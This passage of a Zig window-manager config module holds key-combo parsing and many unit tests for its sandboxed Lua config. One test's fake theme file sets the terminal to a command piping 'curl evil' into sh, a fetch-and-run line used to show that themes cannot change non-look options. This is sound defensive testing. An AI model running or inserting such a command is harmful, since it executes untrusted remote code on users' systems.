    removeBindExact(binds, parsed.mods, parsed.keysym);
    try binds.append(a, .{
        .mods = parsed.mods,
        .keysym = parsed.keysym,
        .command = try a.dupe(u8, command),
    });
}

fn removeBind(binds: *std.ArrayList(Bind), combo_text: []const u8) error{Invalid}!void {
    var buf: [256]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buf);
    const parsed = parseCombo(fba.allocator(), combo_text) orelse return error.Invalid;
    removeBindExact(binds, parsed.mods, parsed.keysym);
}

fn removeBindExact(binds: *std.ArrayList(Bind), mods: Modifiers, keysym: u32) void {
    var i: usize = 0;
    while (i < binds.items.len) {
        const b = binds.items[i];
        if (b.keysym == keysym and modsBits(b.mods) == modsBits(mods)) {
            _ = binds.orderedRemove(i);
        } else i += 1;
    }
}

const Combo = struct { mods: Modifiers, keysym: u32 };

/// "Super+Shift+Return" -> modifiers + keysym. The last `+`-separated
/// token is the key; everything before it is a modifier.
fn parseCombo(a: std.mem.Allocator, s: []const u8) ?Combo {
    var mods: Modifiers = .{};
    var key_name: []const u8 = std.mem.trim(u8, s, " \t");

    if (std.mem.lastIndexOfScalar(u8, key_name, '+')) |i| {
        if (i == key_name.len - 1 and i > 0 and key_name[i - 1] == '+') {
            // "Super++": the key is a literal plus sign.
            mods = parseMods(key_name[0 .. i - 1]) orelse return null;
            key_name = "plus";
        } else {
            mods = parseMods(key_name[0..i]) orelse return null;
            key_name = std.mem.trim(u8, key_name[i + 1 ..], " \t");
        }
    }
    if (key_name.len == 0) return null;

    const z = a.dupeZ(u8, key_name) catch return null;
    var sym = xkb.Keysym.fromName(z, .no_flags);
    if (sym == .NoSymbol) sym = xkb.Keysym.fromName(z, .case_insensitive);
    if (sym == .NoSymbol) {
        // One character, written as itself: ü, ß, ä, é ...
        const cp = singleCodepoint(key_name) orelse return null;
        const ks = xkb_utf32_to_keysym(cp);
        if (ks == 0) return null; // XKB_KEY_NoSymbol
        return .{ .mods = mods, .keysym = ks };
    }
    return .{ .mods = mods, .keysym = @intFromEnum(sym) };
}

extern fn xkb_utf32_to_keysym(ucs: u32) u32;

/// The code point of `s` if it is exactly one UTF-8 encoded character.
fn singleCodepoint(s: []const u8) ?u21 {
    if (s.len == 0) return null;
    const n = std.unicode.utf8ByteSequenceLength(s[0]) catch return null;
    if (n != s.len) return null;
    return std.unicode.utf8Decode(s) catch null;
}

// ----------------------------------------------------------------------------
// Tests
// ----------------------------------------------------------------------------

fn parseText(arena: std.mem.Allocator, cfg: *Config, text: []const u8) !void {
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena, text, cfg, &binds, "<test>");
}

test "colours can be strings (with or without #, or 0x) or plain numbers" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\border_focused = "#112233"
        \\border_unfocused = "445566"
        \\border_floating = 0x778899
    );
    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
    try std.testing.expectEqual(@as(u32, 0x445566), cfg.border_unfocused);
    try std.testing.expectEqual(@as(u32, 0x778899), cfg.border_floating);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);

    try parseText(arena.allocator(), &cfg,
        \\border_focused = "#12345g"
        \\border_unfocused = -1
        \\border_floating = true
    );
    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused); // refused: unchanged
    try std.testing.expectEqual(@as(u32, 3), cfg.parse_warnings);
}

test "enable_autostart parses and defaults on" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.enable_autostart);

    try parseText(arena.allocator(), &cfg, "enable_autostart = false\n");
    try std.testing.expect(!cfg.enable_autostart);
}

test "keyboard options: defaults, values, and nonsense is refused" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expectEqual(@as(u32, 25), cfg.repeat_rate);
    try std.testing.expectEqual(@as(u32, 600), cfg.repeat_delay);
    try std.testing.expect(cfg.repeat_binds);
    try std.testing.expect(cfg.import_environment);

    try parseText(arena.allocator(), &cfg,
        \\repeat_rate = 0
        \\repeat_delay = 250
        \\repeat_binds = false
        \\import_environment = false
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.repeat_rate);
    try std.testing.expectEqual(@as(u32, 250), cfg.repeat_delay);
    try std.testing.expect(!cfg.repeat_binds);
    try std.testing.expect(!cfg.import_environment);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);

    // A refused value changes nothing and is a warning.
    try parseText(arena.allocator(), &cfg,
        \\repeat_rate = -5
        \\repeat_binds = "yes"
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.repeat_rate);
    try std.testing.expect(!cfg.repeat_binds);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "the built-in config names each keyboard and session option once" {
    // A copy-pasted block in default_config.lua once set them twice.
    inline for (.{ "repeat_rate", "repeat_delay", "repeat_binds", "import_environment" }) |name| {
        var count: usize = 0;
        var it = std.mem.splitScalar(u8, default_config_text, '\n');
        while (it.next()) |line| {
            if (std.mem.startsWith(u8, line, name ++ " ") or std.mem.startsWith(u8, line, name ++ "=")) count += 1;
        }
        try std.testing.expectEqual(@as(usize, 1), count);
    }
}

test "command splitting" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const argv = try parseCommand(arena.allocator(), "foot -e \"htop -d 5\"");
    try std.testing.expectEqual(@as(usize, 3), argv.len);
    try std.testing.expectEqualStrings("htop -d 5", argv[2]);
}

test "a program is a string to split or a table that already is the argv" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\terminal = "foot -e \"htop -d 5\""
        \\launcher = { "wofi", "--show", "drun" }
        \\browser = {}
    );
    try std.testing.expectEqual(@as(usize, 3), cfg.terminal.len);
    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
    try std.testing.expectEqualStrings("htop -d 5", cfg.terminal[2]);
    try std.testing.expectEqual(@as(usize, 3), cfg.launcher.len);
    try std.testing.expectEqualStrings("drun", cfg.launcher[2]);
    // An empty table is refused: the default stays.
    try std.testing.expectEqualStrings("firefox", cfg.browser[0]);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "dock and clip options parse, bad values are rejected" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.dock_enabled);
    try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
    try std.testing.expectEqual(ClipCorner.top_left, cfg.clip_corner);

    // A name is one variable: the last assignment is the one that counts,
    // so the bad values come in separate runs.
    try parseText(arena.allocator(), &cfg,
        \\dock_edge = "left"
        \\dock_offset = 120
        \\dock_on_top = false
        \\dock_reserve_space = false
        \\clip_corner = "bottom_right"
        \\clip_collapsed = true
        \\clip_enabled = false
        \\mini_dock = false
        \\workspace_names = { "Main", "", "Web" }
    );
    try parseText(arena.allocator(), &cfg,
        \\clip_corner = "middle"
        \\dock_offset = -4
    );
    try std.testing.expectEqual(DockEdge.left, cfg.dock_edge);
    try std.testing.expectEqual(@as(i32, 120), cfg.dock_offset);
    try std.testing.expect(!cfg.dock_on_top);
    try std.testing.expect(!cfg.dock_reserve_space);
    // The two bad values of the second run changed nothing.
    try std.testing.expectEqual(ClipCorner.bottom_right, cfg.clip_corner);
    try std.testing.expect(cfg.clip_collapsed);
    try std.testing.expect(!cfg.clip_enabled);
    try std.testing.expect(!cfg.mini_dock);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 3), cfg.workspace_names.len);
    try std.testing.expectEqualStrings("Main", cfg.workspace_names[0]);
    try std.testing.expectEqualStrings("", cfg.workspace_names[1]);
    try std.testing.expectEqualStrings("Web", cfg.workspace_names[2]);
}

test "dock_size: 16..256 is accepted, anything else is a warning and changes nothing" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expectEqual(@as(i32, 64), cfg.dock_size);

    try parseText(arena.allocator(), &cfg, "dock_size = 96\n");
    try std.testing.expectEqual(@as(i32, 96), cfg.dock_size);
    try parseText(arena.allocator(), &cfg, "dock_size = 8\n");
    try parseText(arena.allocator(), &cfg, "dock_size = 300\n");
    try parseText(arena.allocator(), &cfg, "dock_size = \"big\"\n");
    try std.testing.expectEqual(@as(i32, 96), cfg.dock_size);
    try std.testing.expectEqual(@as(u32, 3), cfg.parse_warnings);
}

test "the built-in default config has the documented Dock and Clip defaults" {
    // Parse the built-in text itself: config.load() would also read the
    // developer's own config.lua and the test would depend on it.
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), default_config_text, &cfg, &binds, "<built-in>");
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expect(binds.items.len > 40);
    try std.testing.expect(cfg.dock_enabled);
    try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
    try std.testing.expectEqual(@as(i32, 0), cfg.dock_offset);
    try std.testing.expectEqual(@as(i32, 64), cfg.dock_size);
    try std.testing.expect(cfg.dock_on_top);
    try std.testing.expect(cfg.dock_reserve_space);
    try std.testing.expect(cfg.clip_enabled);
    try std.testing.expectEqual(ClipCorner.top_left, cfg.clip_corner);
    try std.testing.expect(cfg.clip_on_top);
    try std.testing.expect(!cfg.clip_collapsed);
    try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try std.testing.expectEqual(@as(usize, 4), cfg.width_presets.len);
}

test "bind_layout: current, a layout number, and nonsense" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();

    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try parseText(arena.allocator(), &cfg, "bind_layout = 1\n");
    try std.testing.expectEqual(@as(?u32, 1), cfg.bind_layout);
    try parseText(arena.allocator(), &cfg, "bind_layout = \"current\"\n");
    try std.testing.expectEqual(@as(?u32, null), cfg.bind_layout);
    try parseText(arena.allocator(), &cfg, "bind_layout = 0\n");
    try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
    for ([_][]const u8{ "bind_layout = 9", "bind_layout = -1", "bind_layout = \"de\"" }) |bad| {
        const before = cfg.parse_warnings;
        try parseText(arena.allocator(), &cfg, bad);
        // Refused: the 0 stays.
        try std.testing.expectEqual(@as(?u32, 0), cfg.bind_layout);
        try std.testing.expectEqual(before + 1, cfg.parse_warnings);
    }
}

test "keys can be named by the character itself (German umlauts, sharp s)" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    const ue = parseCombo(a, "Super+ü").?;
    const by_name = parseCombo(a, "Super+udiaeresis").?;
    try std.testing.expectEqual(by_name.keysym, ue.keysym);
    try std.testing.expect(ue.mods.mod4);

    try std.testing.expect(parseCombo(a, "ss") == null); // not a keysym, and not one character
    try std.testing.expectEqual(parseCombo(a, "ssharp").?.keysym, parseCombo(a, "ß").?.keysym);
    try std.testing.expectEqual(parseCombo(a, "adiaeresis").?.keysym, parseCombo(a, "Alt+ä").?.keysym);
    // Plain ASCII still goes through the name lookup.
    try std.testing.expectEqual(parseCombo(a, "q").?.keysym, parseCombo(a, "Super+q").?.keysym);

    // Not a key: several characters, or nothing sensible.
    try std.testing.expect(parseCombo(a, "Super+üü") == null);
    try std.testing.expect(parseCombo(a, "Super+") == null);
}

test "a bind with an umlaut key is accepted" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "bind(\"Super+ö\", \"close\")\nbind(\"Super+Shift+Ü\", \"exit\")\n", &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(usize, 2), binds.items.len);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

// ---- the script itself -------------------------------------------------------

test "bind and unbind keep their order, and a loop can make binds" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(),
        \\for i = 1, 3 do bind("Super+" .. i, "workspace " .. i) end
        \\bind("Super+2", "close")      -- replaces the workspace bind of Super+2
        \\unbind("Super+3")
        \\bind("Super+Return", [[shell notify-send "$(date)" && true]])
    , &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 3), binds.items.len);
    try std.testing.expectEqualStrings("workspace 1", binds.items[0].command);
    try std.testing.expectEqualStrings("close", binds.items[1].command);
    try std.testing.expectEqualStrings("shell notify-send \"$(date)\" && true", binds.items[2].command);
}

test "bad binds are warnings and change nothing" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(),
        \\bind("Super+Nonsensekey", "close")
        \\bind("Super+x")
        \\bind("Super+y", "")
        \\bind(5, 6)
        \\unbind("Hyper+")
    , &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(usize, 0), binds.items.len);
    try std.testing.expectEqual(@as(u32, 5), cfg.parse_warnings);
}

test "the script can compute and read the environment" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\local base = 4
        \\gap = base * 2 + 1
        \\terminal = os.getenv("WMAKER_WL_SURELY_NOT_SET") or "foot"
    );
    try std.testing.expectEqual(@as(i32, 9), cfg.gap);
    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "a Lua error ends the script there: what ran before stays, one warning" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\gap = 3
        \\error("boom")
        \\outer_gap = 4
    );
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(i32, 8), cfg.outer_gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

test "a syntax error is one warning and changes nothing" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "gap = = 3\n");
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

var test_ran: [16][64]u8 = undefined;
var test_ran_len: [16]usize = .{0} ** 16;
var test_ran_n: usize = 0;

fn testRunner(text: []const u8) void {
    if (test_ran_n >= test_ran.len) return;
    const n = @min(text.len, 64);
    @memcpy(test_ran[test_ran_n][0..n], text[0..n]);
    test_ran_len[test_ran_n] = n;
    test_ran_n += 1;
}

fn testRan(i: usize) []const u8 {
    return test_ran[i][0..test_ran_len[i]];
}

test "bind() takes a Lua function; it runs later with run/spawn/shell" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;

    runner = testRunner;
    defer runner = null;
    test_ran_n = 0;

    try parse(arena.allocator(),
        \\local n = 0
        \\bind("Super+x", function()
        \\  n = n + 1
        \\  run("workspace " .. n)
        \\  spawn("foot -e htop")
        \\  shell("echo hi | cat")
        \\end)
        \\bind("Super+y", "close")
        \\bind("Super+z", function() error("boom") end)
        \\run("close")   -- not inside a bound function: refused
    , &cfg, &binds, "<test>");
    // One warning: the run() at the top level. The function was kept.
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try std.testing.expect(cfg.script != null);
    try std.testing.expectEqual(@as(usize, 3), binds.items.len);
    try std.testing.expect(std.mem.startsWith(u8, binds.items[0].command, "lua "));
    try std.testing.expectEqualStrings("close", binds.items[1].command);

    const ref = try std.fmt.parseInt(i32, binds.items[0].command[4..], 10);
    callLua(&cfg, ref);
    callLua(&cfg, ref); // keeps its upvalue: n is 2 now
    try std.testing.expectEqual(@as(usize, 6), test_ran_n);
    try std.testing.expectEqualStrings("workspace 1", testRan(0));
    try std.testing.expectEqualStrings("spawn foot -e htop", testRan(1));
    try std.testing.expectEqualStrings("shell echo hi | cat", testRan(2));
    try std.testing.expectEqualStrings("workspace 2", testRan(3));

    // An error in the function is logged, not raised, and the state survives.
    const bad = try std.fmt.parseInt(i32, binds.items[2].command[4..], 10);
    callLua(&cfg, bad);
    callLua(&cfg, ref);
    try std.testing.expectEqual(@as(usize, 9), test_ran_n);
    try std.testing.expectEqualStrings("workspace 3", testRan(6));
}

test "a script without Lua binds does not keep its state" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "bind(\"Super+x\", \"close\")\n");
    try std.testing.expect(cfg.script == null);
}

test "an endless loop in a bound function is stopped" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "bind(\"Super+x\", function() while true do end end)\n", &cfg, &binds, "<test>");
    const ref = try std.fmt.parseInt(i32, binds.items[0].command[4..], 10);
    callLua(&cfg, ref); // returns: the instruction limit raised an error
}

test "bind() with a bad key and a function leaves nothing behind" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "bind(\"Hyper+\", function() end)\n", &cfg, &binds, "<test>");
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try std.testing.expectEqual(@as(usize, 0), binds.items.len);
    try std.testing.expect(cfg.script == null);
}

test "a script that asks for far too much memory fails, the rest of the config is read" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\gap = 3
        \\local big = string.rep("x", 400 * 1024 * 1024)
        \\gap = 4
    );
    // The script stopped at the failing line with an error, `gap = 3` ran.
    try std.testing.expect(cfg.parse_warnings >= 1);
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
}

test "a script that grows a table until the memory limit stops there" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\local t = {}
        \\for i = 1, 1e9 do t[i] = { i, i, i, i } end
    );
    try std.testing.expect(cfg.parse_warnings >= 1);
}

test "misspelt options are reported, own variables and helpers are not" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\local x = 5       -- local: not an option
        \\_helper = 1       -- starts with _: not an option
        \\gapp = 8          -- a typo of `gap`
        \\my_colour = "#abcdef"   -- an own variable
        \\somewhere_else = "top"  -- not close to any option: an own variable too
        \\function my_helper() return 1 end
    );
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
}

test "a script can read the options and build on them" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\gap = gap + 2                         -- 8 -> 10
        \\if border_focused == "#d8a657" or true then border_width = border_width + 1 end
        \\table.insert(width_presets, 0.25)     -- changed in place, never assigned
        \\local n = 0
        \\for _ in pairs(workspace_names) do n = n + 1 end
        \\terminal = terminal[1] .. " --class x"
        \\mouse_mod = mouse_mod .. "+Shift"
        \\own = new_window .. "!"
        \\dock_edge = (dock_edge == "right") and "left" or "right"
    );
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
    try std.testing.expectEqual(@as(i32, 10), cfg.gap);
    try std.testing.expectEqual(@as(i32, 3), cfg.border_width);
    try std.testing.expectEqual(@as(usize, 5), cfg.width_presets.len);
    try std.testing.expectEqual(@as(f64, 0.25), cfg.width_presets[4]);
    try std.testing.expectEqual(@as(usize, 3), cfg.terminal.len); // a string is split like a command line
    try std.testing.expectEqualStrings("x", cfg.terminal[2]);
    try std.testing.expect(cfg.mouse_mod.mod4 and cfg.mouse_mod.shift);
    try std.testing.expectEqual(DockEdge.left, cfg.dock_edge);
}

test "only an option the script assigns counts as written down" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var binds: std.ArrayList(Bind) = .empty;
    // Reading dock_edge must not make it explicit; assigning the SAME value must.
    try parse(arena.allocator(), "local e = dock_edge\nclip_corner = clip_corner\n", &cfg, &binds, "config.lua");
    try std.testing.expect(!cfg.explicit.dock_edge);
    try std.testing.expect(cfg.explicit.clip_corner);
}

test "every option reads back what applyOption accepts" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    // Assign every option its own current value: nothing may be refused
    // (that would mean pushOption and applyOption disagree about the form).
    comptime var src: []const u8 = "";
    inline for (all_options) |name| src = src ++ name ++ " = " ++ name ++ "\n";
    try parseText(arena.allocator(), &cfg, src);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "typo distance" {
    try std.testing.expectEqualStrings("gap", closestOption("gapp").?);
    try std.testing.expectEqualStrings("border_width", closestOption("bordr_width").?);
    try std.testing.expect(closestOption("my_colour") == null);
    try std.testing.expect(closestOption("x") == null);
}

test "values of the wrong type are refused, not converted" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg,
        \\gap = "12"
        \\workspace_count = 3.5
        \\focus_follows_mouse = "yes"
        \\new_window = 3
        \\width_presets = 0.5
        \\workspace_names = "Main, Web"
    );
    try std.testing.expectEqual(@as(i32, 8), cfg.gap);
    try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
    try std.testing.expect(!cfg.focus_follows_mouse);
    try std.testing.expectEqual(NewWindowMode.new_column, cfg.new_window);
    try std.testing.expectEqual(@as(usize, 4), cfg.width_presets.len);
    try std.testing.expectEqual(@as(usize, 0), cfg.workspace_names.len);
    try std.testing.expectEqual(@as(u32, 6), cfg.parse_warnings);
}

test "os.exit and io.read are not available to a config" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    // Both are nil now: calling them is an ordinary Lua error (one warning),
    // not the end of the process or a read that never returns.
    try parseText(arena.allocator(), &cfg, "gap = 3\nos.exit(0)\n");
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
    try parseText(arena.allocator(), &cfg, "local x = io.read()\n");
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
    // The rest of both libraries is still there.
    try parseText(arena.allocator(), &cfg, "gap = #os.date() > 0 and 4 or 5\n");
    try std.testing.expectEqual(@as(i32, 4), cfg.gap);
}

test "a UTF-8 byte order mark at the start of the file is skipped" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "\xEF\xBB\xBFgap = 3\n");
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "an endless loop is aborted instead of hanging the session" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "gap = 3\nwhile true do end\n");
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expectEqual(@as(u32, 1), cfg.parse_warnings);
}

// ----------------------------------------------------------------------------
// include / theme
// ----------------------------------------------------------------------------

/// An in-memory file system for the tests: path -> contents.
const FakeFiles = struct {
    paths: []const []const u8,
    texts: []const []const u8,
    reads: usize = 0,

    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
        const self: *FakeFiles = @ptrCast(@alignCast(ctx));
        self.reads += 1;
        for (self.paths, 0..) |p, i| {
            if (std.mem.eql(u8, p, path)) return a.dupe(u8, self.texts[i]) catch null;
        }
        return null;
    }

    fn includer(self: *FakeFiles, dir: []const u8) Includer {
        return .{ .ctx = self, .read = read, .dir = dir };
    }
};

fn parseFake(files: *FakeFiles, main_text: []const u8, cfg: *Config) !void {
    var binds: std.ArrayList(Bind) = .empty;
    const inc = files.includer("/cfg");
    try parseWith(cfg.arena.allocator(), main_text, cfg, &binds, "/cfg/config.lua", &inc, false);
    cfg.binds = try binds.toOwnedSlice(cfg.arena.allocator());
}

test "include runs another file in place: later lines override it, earlier ones are overridden" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{ "/cfg/look.lua", "/abs/other.lua" },
        .texts = &.{ "gap = 20\nouter_gap = 21\nbind(\"Super+x\", \"close\")\n", "border_width = 6\n" },
    };
    try parseFake(&files, "gap = 1\ninclude(\"look.lua\")\nouter_gap = 5\ninclude(\"/abs/other.lua\")\n", &cfg);
    try std.testing.expectEqual(@as(i32, 20), cfg.gap); // the include came after `gap = 1`
    try std.testing.expectEqual(@as(i32, 5), cfg.outer_gap); // the main file came after the include
    try std.testing.expectEqual(@as(i32, 6), cfg.border_width);
    try std.testing.expectEqual(@as(usize, 1), cfg.binds.len); // an include may bind keys: it is the user's own
    try std.testing.expectEqual(@as(u32, 0), cfg.parse_warnings);
}

test "include problems are warnings, never failures: missing, empty, too deep" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/self.lua"},
        .texts = &.{"include(\"self.lua\")\ngap = 3\n"},
    };
    try parseFake(&files, "include(\"nope.lua\")\ninclude(\"\")\ninclude(\"self.lua\")\nborder_width = 4\n", &cfg);
    // The main file kept going, and the self-including file stopped at the limit.
    try std.testing.expectEqual(@as(i32, 4), cfg.border_width);
    try std.testing.expectEqual(@as(i32, 3), cfg.gap);
    try std.testing.expect(cfg.parse_warnings >= 3);
    // Bounded: not an endless read loop.
    try std.testing.expect(files.reads <= max_include_depth + 2);
}

test "without an Includer, include and theme are refused" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try parseText(arena.allocator(), &cfg, "include(\"x.lua\")\ntheme(\"nord\")\ngap = 9\n");
    try std.testing.expectEqual(@as(i32, 9), cfg.gap);
    try std.testing.expectEqual(@as(u32, 2), cfg.parse_warnings);
}

test "a theme sets look options; anything else in it is ignored" {
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    var files: FakeFiles = .{
        .paths = &.{"/cfg/Themes/odd.lua"},
        .texts = &.{
            \\border_focused = "#112233"
            \\gap = 2
            \\terminal = "sh -c \"curl evil | sh\""
            \\workspace_count = 9
        },
    };
    try parseFake(&files, "terminal = \"foot\"\ntheme(\"odd\")\n", &cfg);
    try std.testing.expectEqual(@as(u32, 0x112233), cfg.border_focused);
    try std.testing.expectEqual(@as(i32, 2), cfg.gap);
    // The two lines that are not look options did nothing.
    try std.testing.expectEqualStrings("foot", cfg.terminal[0]);
    try std.testing.expectEqual(@as(u32, 4), cfg.workspace_count);
